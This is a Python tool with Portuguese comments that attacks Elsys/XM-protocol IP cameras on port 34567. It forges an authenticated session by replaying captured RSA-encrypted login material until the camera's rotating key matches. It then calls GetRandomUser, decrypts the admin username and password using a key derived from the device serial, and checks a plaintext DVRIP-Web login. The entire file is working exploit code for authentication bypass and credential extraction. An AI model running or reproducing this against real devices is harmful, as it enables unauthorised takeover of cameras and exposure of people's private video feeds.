# -*- coding: utf-8 -*-
"""
elsys_conta_rapido.py  -  Forja a sessao RSA da Elsys aceitando QUALQUER chave
                          capturada (nao so uma) e roda o GetRandomUser.

Por que: o revezamento da camera tem ~8 chaves. Com varias chaves capturadas
(material_multi.json), quase toda conexao casa com alguma - entao a sessao
sobe em 1-2 tentativas, sem depender do worker lento do elsys_xm.py.

Uso (sessao INICIAR_SESSAO.bat FECHADA):
  python ferramentas\\elsys_conta_rapido.py 192.168.3.119 2c9fea3d01e8fa07
"""
import argparse
import base64
import hashlib
import json
import os
import re
import socket
import struct
import sys
import time

RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, RAIZ)
import elsys_xm  # noqa: E402  (rsa_pkcs1v15, _frame, _recv_frame)

PORTA = 34567
LOGIN = 1000
RANDOMUSER = 1660
K = b"ABCDEF0123456789"          # nossa CommunicateKey de sessao (16 bytes)


def _aes():
    from Crypto.Cipher import AES
    return AES


def enc(body):
    AES = _aes()
    data = body + b"\x00" * ((-len(body)) % 16)
    return AES.new(K, AES.MODE_CBC, b"\x00" * 16).encrypt(data)


def dec(cipher):
    AES = _aes()
    return AES.new(K, AES.MODE_CBC, b"\x00" * 16).decrypt(cipher)


def cmd(sock, session, msgid, body_json, timeout=8):
    payload = base64.b64encode(enc(body_json.encode() + b"\x00")) + b"\x00"
    sock.sendall(elsys_xm._frame(msgid, payload, sessao=session))
    mid, sess, corpo = elsys_xm._recv_frame(sock, timeout)
    if mid is None:
        return None
    s = corpo.rstrip(b"\x00\r\n ")
    if s[:1] in (b"{", b"["):
        try:
            return json.loads(s.decode("utf-8", "replace"))
        except Exception:
            return None
    try:
        plain = dec(base64.b64decode(s + b"=" * (-len(s) % 4))).rstrip(b"\x00\r\n ")
        return json.loads(plain.decode("utf-8", "replace"))
    except Exception:
        return None


def forja(ip, chaves, abre, tentativas=60):
    """Abre conexoes ate o 1414 casar com uma chave capturada e o login dar 100."""
    por_md5 = {c["alvo_md5_1414"]: c for c in chaves}
    for i in range(tentativas):
        try:
            s = socket.create_connection((ip, PORTA), timeout=6)
        except OSError:
            time.sleep(0.5)
            continue
        try:
            s.sendall(abre)
            s14 = None
            md5 = None
            for _ in range(4):
                mid, sess, corpo = elsys_xm._recv_frame(s, 3)
                if mid is None:
                    break
                if mid == 1414:
                    md5 = hashlib.md5(corpo.rstrip(b"\x00\r\n ")).hexdigest()
                    s14 = sess
                    break
            c = por_md5.get(md5)
            if not c:
                s.close()
                continue
            N, e = (int(x, 16) for x in c["PublicKey"].split(","))
            ck = elsys_xm.rsa_pkcs1v15(K, N, e).hex().upper()
            login = {"EncryptType": "MD5", "LoginType": "DVRIP-FutureHome",
                     "UserName": c["UserName_rsa"], "PassWord": c["PassWord_rsa"],
                     "CommunicateKey": ck}
            lb = json.dumps(login, separators=(",", ":")).encode() + b"\x00"
            s.sendall(elsys_xm._frame(LOGIN, lb, sessao=s14))
            for _ in range(5):
                mid, sess, corpo = elsys_xm._recv_frame(s, 6)
                if mid == 1001:
                    j = json.loads(corpo.rstrip(b"\x00\r\n ").decode())
                    if j.get("Ret") == 100:
                        print("    casou a chave %s na tentativa %d." % (md5[:8], i + 1))
                        return s, int(str(j.get("SessionID")), 16)
                    break
                if mid is None:
                    break
            s.close()
        except Exception:
            try:
                s.close()
            except Exception:
                pass
    return None, 0


def deriva_chave(serial):
    return serial[5:11] + serial[1:7] + serial[8:12] if len(serial) >= 12 else None


def descriptografa(info_b64, serial):
    AES = _aes()
    chave = deriva_chave(serial)
    if not chave or len(chave) != 16:
        print("  [!] serial inesperado (%r)" % serial)
        return None
    claro = AES.new(chave.encode(), AES.MODE_CBC, b"\x00" * 16).decrypt(
        base64.b64decode(info_b64)).decode("ascii", "replace")
    u = re.search(r"p1:(\S*)", claro)
    p = re.search(r"p2:(\S*)", claro)
    return (u.group(1), p.group(1)) if u and p and u.group(1) and p.group(1) else None


def sofia_hash(s):
    tab = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    h = hashlib.md5(s.encode()).digest()
    return "".join(tab[(h[i] + h[i + 1]) % 62] for i in range(0, 16, 2))


def login_web(ip, u, p, timeout=8):
    s = socket.create_connection((ip, PORTA), timeout=timeout)
    try:
        s.settimeout(timeout)
        obj = {"EncryptType": "MD5", "LoginType": "DVRIP-Web",
               "PassWord": sofia_hash(p), "UserName": u}
        body = json.dumps(obj, separators=(",", ":")).encode() + b"\x0a\x00"
        cab = bytearray(20)
        cab[0] = 255
        struct.pack_into("<H", cab, 14, LOGIN)
        struct.pack_into("<I", cab, 16, len(body))
        s.sendall(bytes(cab) + body)
        mid, sess, corpo = elsys_xm._recv_frame(s, timeout)
        return json.loads(corpo.rstrip(b"\x00\r\n ").decode()).get("Ret")
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("ip")
    ap.add_argument("serial")
    ap.add_argument("--material", default=os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                                        "elsys_multi_%s.json"))
    ap.add_argument("--tentativas", type=int, default=60)
    args = ap.parse_args()

    base = os.path.dirname(os.path.abspath(__file__))
    mat = json.load(open(os.path.join(base, "elsys_multi_%s.json" % args.ip.replace(".", "_"))))
    abre = open(os.path.join(base, "elsys_%s_abre.bin" % args.ip.replace(".", "_")), "rb").read()
    chaves = mat["chaves"]

    print("=" * 64)
    print(" ELSYS conta rapida  -  %s  (%d chaves no bolso)" % (args.ip, len(chaves)))
    print("=" * 64)
    print("[1] Forjando (ate %d conexoes, aceita qualquer chave)..." % args.tentativas)
    sock, session = forja(args.ip, chaves, abre, args.tentativas)
    if not sock:
        print("    [X] nenhuma chave casou. Faca uma captura PCAPdroid nova e reprocesse.")
        sys.exit(2)
    print("    OK. Sessao viva (SID=0x%08X)." % session)

    print("[2] GetRandomUser (1660) na sessao ...")
    r = cmd(sock, session, RANDOMUSER, '{"Name":"GetRandomUser","SessionID":"0x%08X"}' % session)
    try:
        sock.close()
    except Exception:
        pass
    if not r:
        print("    [X] sem resposta. (a camera pode nao ter GetRandomUser nessa firmware)")
        sys.exit(3)
    bloco = r.get("GetRandomUser") or {}
    info = bloco.get("Info") or bloco.get("InfoUser")
    if not info:
        print("    [X] sem campo Info. Resposta: %r" % r)
        sys.exit(4)
    conta = descriptografa(info, args.serial)
    if not conta:
        print("    [!] decifrou mas nao achei p1/p2.")
        sys.exit(5)
    user, senha = conta
    print("    >>> CONTA REAL: usuario = %s   senha = %s" % (user, senha))

    print("[3] Testando login DVRIP-Web (texto puro) ...")
    try:
        ret = login_web(args.ip, user, senha)
        if ret in (100, 515):
            print("    >>> LOGIN OK! A Elsys loga por texto puro - RSA aposentado.")
            print("        No config.py:  CAM_ADMIN_USUARIO = %r / CAM_ADMIN_SENHA = %r" % (user, senha))
        else:
            print("    [!] Ret %s - a conta esta certa, mas talvez a Elsys exija RSA p/ login." % ret)
    except OSError as e:
        print("    [!] nao testei (%s)" % e)
    print("=" * 64)


if __name__ == "__main__":
    main()
